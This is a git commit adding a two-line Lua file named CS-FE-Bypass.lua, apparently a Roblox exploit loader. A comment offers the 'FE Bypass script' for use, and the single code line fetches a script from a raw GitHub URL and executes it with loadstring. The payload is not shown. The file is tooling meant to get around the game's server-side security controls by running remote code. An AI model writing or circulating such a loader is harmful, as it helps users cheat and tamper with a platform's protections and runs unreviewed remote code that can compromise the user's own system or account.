b9288192c6a9b5c39265fa01d225b38fc909087e
Asi <148603975+SuperBlueEyeBall@users.noreply.github.com>
2024-07-05 15:47:45 -0500

    Create CS-FE-Bypass.lua

---
+++ CS-FE-Bypass.lua
@@ -0,0 +1,2 @@
+--updatable version of the FE Bypass script. Feel free to use this script or the one below.
+loadstring(game:HttpGet("https://raw.githubusercontent.com/g00lXploiter/g00lXploiter/main/Fe%20bypass", true))()
